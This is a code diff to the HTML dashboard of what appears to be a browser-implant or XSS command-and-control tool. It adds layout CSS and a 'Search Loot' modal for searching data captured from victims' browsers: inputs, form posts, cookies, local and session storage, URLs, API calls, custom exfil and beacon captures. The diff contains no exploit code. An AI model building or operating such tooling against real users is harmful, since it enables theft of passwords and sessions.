@@ -125,6 +125,31 @@
 			border-radius: 0.375rem !important;
 			border-top-width: 1px !important;
 		}
+
+		/* Client card overflow handling */
+		#client-stack .card-title {
+			display: flex;
+			align-items: center;
+			min-width: 0;
+		}
+		#client-stack .card-title .client-name {
+			overflow: hidden;
+			text-overflow: ellipsis;
+			white-space: nowrap;
+			min-width: 0;
+		}
+		#client-stack .card-title .client-card-actions {
+			display: flex;
+			align-items: center;
+			gap: 6px;
+			margin-left: auto;
+			flex-shrink: 0;
+			padding-left: 6px;
+		}
+		#client-stack .card-subtitle,
+		#client-stack .card-text {
+			word-break: break-word;
+		}
 	</style>
 </head>
 
@@ -290,8 +315,12 @@
 
 					<div class="d-flex justify-content-between align-items-center">
 						<label style="margin-top: 8px;"><h4 id="loot-header-text"><b>&nbsp;&nbsp;Loot</b></h4></label>
-						<button type="button" class="btn btn-primary position-relative" id="eventFilterBtn" onclick=showEventFilterModal()><img src="/protectedStatic/filter.svg"></button>
-
+						<div>
+							<button type="button" class="btn btn-primary position-relative me-1" onclick="showLootSearchModal()" title="Search Loot">
+								<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>
+							</button>
+							<button type="button" class="btn btn-primary position-relative" id="eventFilterBtn" onclick=showEventFilterModal()><img src="/protectedStatic/filter.svg"></button>
+						</div>
 					</div>
 					<div class="card-stack" id="detail-stack">
 					</div>
@@ -1003,6 +1032,75 @@
 			</div>
 		</div>
 
+
+
+		<!-- Loot Search Modal -->
+		<div id="lootSearchModal" class="modal fade modal-xl" tabindex="-1" aria-hidden="true">
+			<div class="modal-dialog modal-xl">
+				<div class="modal-content">
+					<div class="modal-header">
+						<h5 class="modal-title">Search Loot</h5>
+						<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+					</div>
+					<div class="modal-body">
+						<div class="row mb-3">
+							<div class="col-md-5">
+								<label class="form-label"><b>Client Filter</b> <small class="text-muted">(same syntax as client list: && / !)</small></label>
+								<input type="text" class="form-control" id="lootSearchClientFilter" placeholder="e.g. wp5 && linux">
+							</div>
+							<div class="col-md-5">
+								<label class="form-label"><b>Search Query</b></label>
+								<input type="text" class="form-control" id="lootSearchQuery" placeholder="e.g. password">
+							</div>
+							<div class="col-md-2 d-flex flex-column justify-content-end">
+								<div class="mb-1">
+									<select class="form-select form-select-sm" id="lootSearchSortOrder">
+										<option value="newest" selected>Newest first</option>
+										<option value="oldest">Oldest first</option>
+									</select>
+								</div>
+								<button type="button" class="btn btn-primary w-100" onclick="executeLootSearch(1)">Search</button>
+							</div>
+						</div>
+						<div class="mb-3">
+							<label class="form-label"><b>Event Types</b></label>
+							<div class="d-flex mb-2">
+								<button type="button" class="btn btn-outline-secondary btn-sm me-2" onclick="lootSearchSelectAll()">Select All</button>
+								<button type="button" class="btn btn-outline-secondary btn-sm" onclick="lootSearchSelectNone()">Select None</button>
+							</div>
+							<div class="row">
+								<div class="col-md-4">
+									<small class="text-muted">App Events</small>
+									<div class="form-check"><input class="form-check-input loot-search-evt" type="checkbox" value="USERINPUT" id="ls_USERINPUT" checked><label class="form-check-label" for="ls_USERINPUT">Inputs</label></div>
+									<div class="form-check"><input class="form-check-input loot-search-evt" type="checkbox" value="FORMPOST" id="ls_FORMPOST" checked><label class="form-check-label" for="ls_FORMPOST">Forms</label></div>
+									<div class="form-check"><input class="form-check-input loot-search-evt" type="checkbox" value="COOKIE" id="ls_COOKIE" checked><label class="form-check-label" for="ls_COOKIE">Cookies</label></div>
+									<div class="form-check"><input class="form-check-input loot-search-evt" type="checkbox" value="LOCALSTORAGE" id="ls_LOCALSTORAGE" checked><label class="form-check-label" for="ls_LOCALSTORAGE">Local Storage</label></div>
+									<div class="form-check"><input class="form-check-input loot-search-evt" type="checkbox" value="SESSIONSTORAGE" id="ls_SESSIONSTORAGE" checked><label class="form-check-label" for="ls_SESSIONSTORAGE">Session Storage</label></div>
+								</div>
+								<div class="col-md-4">
+									<small class="text-muted">&nbsp;</small>
+									<div class="form-check"><input class="form-check-input loot-search-evt" type="checkbox" value="URLVISITED" id="ls_URLVISITED" checked><label class="form-check-label" for="ls_URLVISITED">URLs</label></div>
+									<div class="form-check"><input class="form-check-input loot-search-evt" type="checkbox" value="XHRAPICALL" id="ls_XHRAPICALL" checked><label class="form-check-label" for="ls_XHRAPICALL">XHR Calls</label></div>
+									<div class="form-check"><input class="form-check-input loot-search-evt" type="checkbox" value="FETCHAPICALL" id="ls_FETCHAPICALL" checked><label class="form-check-label" for="ls_FETCHAPICALL">Fetch Calls</label></div>
+									<div class="form-check"><input class="form-check-input loot-search-evt" type="checkbox" value="CUSTOMEXFIL" id="ls_CUSTOMEXFIL" checked><label class="form-check-label" for="ls_CUSTOMEXFIL">Custom Exfil</label></div>
+								</div>
+								<div class="col-md-4">
+									<small class="text-muted">Beacon Events</small>
+									<div class="form-check"><input class="form-check-input loot-search-evt" type="checkbox" value="BEACON_CAPTURE" id="ls_BEACON_CAPTURE" checked><label class="form-check-label" for="ls_BEACON_CAPTURE">Captures</label></div>
+									<div class="form-check"><input class="form-check-input loot-search-evt" type="checkbox" value="BEACON_VISIT" id="ls_BEACON_VISIT" checked><label class="form-check-label" for="ls_BEACON_VISIT">Visits</label></div>
+								</div>
+							</div>
+						</div>
+						<div id="lootSearchSummary" class="text-muted mb-2" style="display:none;"></div>
+						<div id="lootSearchResults" style="max-height: 450px; overflow-y: auto;"></div>
+					</div>
+					<div class="modal-footer" id="lootSearchFooter">
+						<div id="lootSearchPagination" class="d-flex align-items-center gap-2"></div>
+						<button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+					</div>
+				</div>
+			</div>
+		</div>
 
 	</body>
 	</html>
